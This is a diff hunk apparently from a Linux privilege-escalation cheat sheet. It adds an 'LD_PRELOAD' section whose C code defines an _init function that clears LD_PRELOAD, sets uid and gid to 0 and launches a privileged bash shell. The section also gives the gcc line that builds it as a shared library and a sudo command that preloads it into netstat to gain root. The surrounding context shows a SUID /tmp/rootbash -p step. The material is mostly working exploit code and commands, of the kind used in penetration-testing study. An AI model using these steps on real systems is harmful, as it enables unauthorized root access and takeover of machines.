@@ -1751,7 +1751,27 @@ EOF
 
 ls -la /tmp/rootbash
 /tmp/rootbash -p
-id  
+id
+```
+
+- LD_PRELOAD
+
+```
+$ nano x.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash -p");
+}
+
+$ gcc -fPIC -shared -nostartfiles -o x.so x.c
+
+$sudo LD_PRELOAD=/tmp/x.so /usr/bin/netstat
 ```
 
 - Disk Group
